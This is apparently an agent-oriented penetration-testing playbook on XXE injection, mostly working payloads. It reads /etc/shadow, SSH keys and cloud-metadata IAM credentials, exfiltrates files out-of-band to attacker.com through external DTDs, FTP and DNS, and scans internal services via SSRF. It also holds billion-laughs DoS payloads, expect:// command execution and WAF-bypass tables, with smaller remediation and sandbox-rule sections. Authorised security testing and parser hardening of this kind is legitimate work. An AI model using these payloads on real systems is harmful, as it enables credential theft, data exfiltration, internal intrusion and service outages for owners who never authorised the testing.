# XML External Entity (XXE) Injection — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application)
**OWASP Mapping:** A05:2021 – Security Misconfiguration, A03:2021 – Injection
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: xxe-v2
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A05:2021-Security Misconfiguration
  - A03:2021-Injection
tags:
  - xxe
  - xml-external-entity
  - web-application
  - xml-injection
  - blind-xxe
  - ssrf
  - T1190
environments:
  - web
  - api
  - soap
  - saml
  - document-parsing
  - file-upload
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Entry Point Enumeration

XXE arises wherever the server parses attacker-influenced XML. Audit the following:

| Functionality | Typical Parameter / Location | Risk |
|---|---|---|
| XML / SOAP API endpoints | `Content-Type: application/xml`, SOAP body | High |
| Document upload (DOCX, XLSX, PDF, SVG) | multipart file upload | High |
| SAML / SSO authentication | Base64-decoded SAML `Assertion` | High |
| DTD / XSD schema processing | `schema`, `validation` params | High |
| RSS / ATOM feed ingestion | `url`, `feed`, fetched feed body | Medium |
| Legacy ASP / .NET endpoints | `.asmx`, `.svc`, `XML` post bodies | High |
| Java / PHP endpoints parsing XML | request body, form `xml` param | High |
| Office file converters / previewers | uploaded `.docx` / `.xlsx` files | High |

Look for request headers and bodies that indicate XML parsing:

```
POST /api/upload HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<document>...</document>
```

### 1.2 Basic XXE Probes (PayloadsAllTheThings)

**Classic in-band file read probe:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Linux targeted reads:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/version"> ]>
```

**Windows targeted reads:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/boot.ini"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"> ]>
```

**SSRF probe via entity:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<foo>&xxe;</foo>
```

### 1.3 Out-of-Band (OOB) Probes

Used when the entity value is not reflected in the response:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe-callback">
  %xxe;
]>
<foo>test</foo>
```

Blind detection with Interactsh / Burp Collaborator:

```bash
interactsh-client -v
```

```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<unique>.interactsh.example.com/xxe">
  %xxe;
]>
<foo>test</foo>
```

Any HTTP or DNS hit on the callback domain proves the parser resolves external entities.

### 1.4 Error-Based XXE Probe

Forced error disclosure of file contents (DTD-based error oracle):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

If the parser prints parser error messages, it leaks file contents inside the error string.

### 1.5 Automated Detection

```bash
# Nuclei XXE templates
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/xxe/ -jsonl xxe.jsonl

# Targeted XML endpoint
nuclei -u https://target.com/api/upload -d @xxe-body.xml -jsonl xxe.jsonl
```

**Burp Suite manual flow:**
1. Intercept any request with `Content-Type: application/xml` or file upload
2. Send to Repeater
3. Replace body with basic XXE probe
4. Grep response for `root:` (Linux) or `; for 16-bit` (Windows win.ini)
5. If no reflection, switch to OOB probes with Interactsh

---

## 2. Confirmation

### 2.1 In-Band Confirmation

Send the basic probe and check for:
- `/etc/passwd` content in response (`root:x:0:0:`)
- `win.ini` content (`; for 16-bit app support`)
- Internal HTTP responses embedded in the XML output
- Custom error messages quoting the file path

### 2.2 Blind / Error-Based Confirmation

| Signal | Meaning |
|---|---|
| Callback on Interactsh / Collaborator | Parser resolved external entity (blind XXE) |
| Error message leaks `/etc/passwd` line | Error-based XXE works |
| 403 / filter after OOB payload | WAF present, attempt bypass |
| XML parsing error with entity name | Parser rejects DTD but message is diagnostic |

### 2.3 Confirmation Checklist

- [ ] Distinct response difference between `&xxe;` entity and harmless text
- [ ] File contents or parser error confirmed
- [ ] OOB callback captured where no in-band reflection exists
- [ ] Content type variants (XML, JSON-embedded, SVG) tested

---

## 3. Exploitation

### 3.1 File Read

**Linux:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/issue"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/config.php"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> ]>
```

**Windows:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Users/Administrator/NTUSER.DAT"> ]>
```

### 3.2 Blind XXE with OOB Exfiltration

Host an external DTD on the attacker server:

```xml
<!-- attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/exfil?data=%file;'>">
%eval;
%exfil;
```

Blind payload sent to the target:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

Alternative exfil without a DTD server (data in DNS query):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://xxe.<hex-of-data>.interactsh.example.com/'>">
```

Exfil over FTP / HTTP when `http://` is filtered:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
```

### 3.3 SSRF via XXE

Internal port scanning and service fingerprinting:

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">          <!-- Redis -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">          <!-- MySQL -->
<!ENTITY xxe SYSTEM "http://10.0.0.5:9200/">           <!-- Elasticsearch -->
<!ENTITY xxe SYSTEM "http://internal-admin:80/">       <!-- internal hostname -->
```

Cloud metadata:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
```

### 3.4 DoS — Billion Laughs Attack

Billion laughs (Xerces exponential entity expansion):

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Quadratic blowup payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE blah [
  <!ENTITY x "AAAA...AAAA">  <!-- tens of thousands of A's -->
]>
<blah>
  <x>&x;</x><x>&x;</x><x>&x;</x><x>&x;</x>...  <!-- repeated thousands of times -->
</blah>
```

Use only against dedicated sandbox targets; confirm CPU/memory exhaustion and log parser crash.

### 3.5 XXE in Different Content Types

**XML inside JSON (XXE-JSON):**
```json
{
  "content-type": "application/xml",
  "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>"
}
```

**SVG file read / blind callback:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="20" y="30">&xxe;</text>
</svg>
```

**DOCX (Office Open XML):** modify `word/document.xml` inside the ZIP:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>
```

**XLSX:** modify `xl/workbook.xml` or cell XML:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData><row r="1"><c r="A1"><v>&xxe;</v></c></row></sheetData>
</worksheet>
```

**PDF (some parsers):** XML metadata with XXE in `XMP` or `FDF` streams.

**Re-zipping DOCX/XLSX:**
```bash
mkdir -p unpack && cd unpack
unzip ../evil.docx
sed -i '1i <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>' word/document.xml
cd .. && zip -r evil-xxe.docx unpack/
```

### 3.6 WAF Bypass

**Entity encoding:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///et&#99;/pa&#115;swd"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///%65tc/passwd"> ]>
```

**Parameter entities instead of general entities:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<foo>test</foo>
```

**Alternate protocol schemes:**
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "ftp://attacker.com/x">
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">      <!-- Java -->
<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/">  <!-- Java -->
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">               <!-- PHP expect module -->
<!ENTITY xxe SYSTEM "compress.zlib://file:///etc/passwd">  <!-- PHP -->
<!ENTITY xxe SYSTEM "data://text/plain,data">     <!-- PHP -->
```

**Spacing / tab / newline obfuscation inside DOCTYPE:**
```xml
<!DOCTY
PE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

**Case / whitespace tricks and CDATA wrapping:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo><![CDATA[&xxe;]]></foo>
```

**DOCTYPE removal and re-insertion** to defeat naive regex filters that strip the first `<!DOCTYPE`.

**Multiple entities / duplicate tags to split detection rules.**

---

## 4. Tool-Specific Guidance

### 4.1 Burp Suite

1. `Content-Type` rewrite: change `application/json` to `application/xml` and wrap body
2. Repeater workflow for each endpoint (see section 1.5)
3. Collaborator client for blind OOB detection
4. Extensions:
   - **XXEinjector** (blind file read, Netdoc/OOB exfil, http/file/ftp protocols)
   - **Burp Collaborator** for DNS/HTTP callbacks
   - **WSDL/XML beautifier** for SOAP body editing
   - **Content-type converter** extension

XXEinjector examples:
```bash
ruby XXEinjector.rb --host=attacker.com --file=/tmp/xxe-requests.txt --path=/etc/passwd --oob=http
ruby XXEinjector.rb --host=attacker.com --file=/tmp/req.txt --tamper=... --phpfilter
ruby XXEinjector.rb --host=attacker.com --file=/tmp/req.txt --netdoc
```

### 4.2 Manual Testing Flow

```bash
# Capture a valid XML request, then substitute body:
curl -s -X POST https://target.com/api/upload \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>'

# Test without reflection using a callback
curl -s -X POST https://target.com/api/upload \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://callback.interactsh.example.com/x"> %xxe; ]><foo>t</foo>'
```

### 4.3 Nuclei XXE Templates

```bash
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/xxe/ -jsonl xxe.jsonl
nuclei -u https://target.com -t http/smuggling/ -tags xxe -jsonl
```

### 4.4 Known Scanner Notes

- `libxml2` based PHP parsers are vulnerable to `php://` and basic `file://`
- Java `DocumentBuilderFactory` without `setFeature` guards allows OOB via external DTD
- Python `lxml` and `defusedxml` states differ; plain `xml.etree` resolves entities
- .NET `XmlReader` / `XmlDocument` default to resolving external DTDs in older versions

---

## 5. PoC Generation

### PoC Template

```markdown
## XXE — [FINDING_ID]

**URL:** https://target.com/api/upload
**Endpoint/Parameter:** XML body / SOAP action / file upload field
**Type:** In-band / Blind (OOB) / Error-based
**Parser/Stack:** PHP/libxml2 / Java (JAXP) / Python lxml / .NET XmlReader
**Impact:** File read / SSRF / DoS / RCE (expect://)

### Payload
```
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

### Evidence
- [Response containing /etc/passwd]
- [Interactsh / Collaborator DNS+HTTP callback]
- [Error message leaking file contents]
- [Internal HTTP response from SSRF probe]

### Impact
- File read: /etc/passwd, /proc/self/environ, web.config
- SSRF reachable internal hosts: 127.0.0.1, 10.x.x.x
- Cloud metadata accessible: YES/NO
- DoS reproducible: YES/NO (sandbox only)
- RCE via expect:// or SSRF chain: YES/NO

### Remediation
- Disable DTD processing entirely (`setFeature` / `setProperty` on all XML parsers)
- If DTDs required, disable `external-general-entities`, `external-parameter-entities`, `external-dtd`
- Use a safe parser (Python `defusedxml`, .NET `XmlReaderSettings.DtdProcessing = Prohibit`)
- Reject `application/xml` unless required; validate content type server-side
- Run document parsers in sandboxed/low-privilege processes with egress restrictions
- Apply `DOCTYPE` and `ENTITY` allow/deny lists; set entity expansion limits

### Reproduction Steps
1. POST the payload with `Content-Type: application/xml`
2. Observe `/etc/passwd` in the response (or OOB callback)
3. Escalate to blind OOB DTD exfil for arbitrary file read
4. Test SSRF against 127.0.0.1 and cloud metadata
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Reproduction in Docker/VM with the same parser library version
- [ ] File reads limited to sandbox files (no production secrets)
- [ ] OOB exfil hits sandbox-controlled server only
- [ ] SSRF tested against mock internal services (localhost demo apps)
- [ ] Billion-laughs / DoS payloads executed only in an isolated container with memory caps
- [ ] No production traffic generated; impact scope documented

### Prohibited Actions
- Reading real production configuration or secret files
- Sending OOB callbacks to production-external infrastructure
- Attacking real internal network hosts via XXE-SSRF
- Executing resource-exhaustion payloads against production parsers

---

## 7. Cheat Sheet / Reference

### Payloads Quick Reference

| Goal | Payload |
|---|---|
| Read file (Linux) | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| Read file (Windows) | `<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">` |
| SSRF internal | `<!ENTITY xxe SYSTEM "http://127.0.0.1:PORT/">` |
| Cloud metadata | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` |
| Blind exfil | External DTD + `%file;` in `http://attacker.com/?%file;` |
| PHP filter read | `<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file">` |
| Error-based | `file:///nonexistent/%file;` inside internal error entity |
| RCE (PHP) | `<!ENTITY xxe SYSTEM "expect://id">` (expect extension) |
| DoS | Billion laughs / quadratic blowup |
| SVG | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` in `<text>` |
| DOCX/XLSX | Inject DTD into `word/document.xml` / `xl/workbook.xml` |

### Bypass Table

| Filter | Bypass |
|---|---|
| Blocks `file://` | `php://filter`, `expect://`, `netdoc://`, `ftp://`, `jar:` |
| Blocks `DOCTYPE` string | Encoding, comments, whitespace splitting, parameter entities |
| Blocks `/etc/passwd` | URL-encode path segments, `%65tc`, base64 filter |
| Blocks inline entities | External DTD + parameter entities |
| Only JSON content type | Embed XML in JSON body / `Content-Type` smuggling |
| Only accepts valid XML structure | CDATA wrapping, correct namespace prefixes |

### Parser Mitigation Reference

| Stack | Safe configuration |
|---|---|
| Java (JAXP) | `disallow-doctype-decl`, `external-general-entities=false`, `external-parameter-entities=false` |
| .NET | `DtdProcessing = Prohibit` |
| Python | `defusedxml`, `lxml` without resolve_entities or with `resolve_entities=False` |
| PHP | `libxml_disable_entity_loader(true)`, `LIBXML_NONET`, PHP >= 8 with `libxml2` defaults |
| Ruby | `Nokogiri` with `noent` / external entity disabled, `ox` safe parser |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial access |
| T1005 | Data from Local System | File read |
| T1083 | File and Directory Discovery | Enumerate server files |
| T1552.001 | Unsecured Credentials: Credentials In Files | config.php, .env, web.config |
| T1059 | Command and Scripting Interpreter | RCE via expect:// |
| T1090 | Proxy | SSRF as proxy to internal network |
| T1552.005 | Unsecured Credentials: Cloud Instance Metadata API | Cloud credential theft |
| T1611 | Escape to Host | SSRF into Docker/K8s API |
| T1485 | Data Destruction | Billion-laughs DoS |
| T1499 | Endpoint Denial of Service | Resource exhaustion |

---

## 9. References

- PayloadsAllTheThings XXE: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- HackTricks XXE: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
- HackTricks XXE-Cheat-Sheet: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity/xxe-cheat-sheet
- XXEinjector: https://github.com/enjoiz/XXEinjector
- PortSwigger XXE Academy: https://portswigger.net/web-security/xxe
- OWASP XML External Entity Prevention: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- Billion Laughs: https://en.wikipedia.org/wiki/Billion_laughs_attack

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
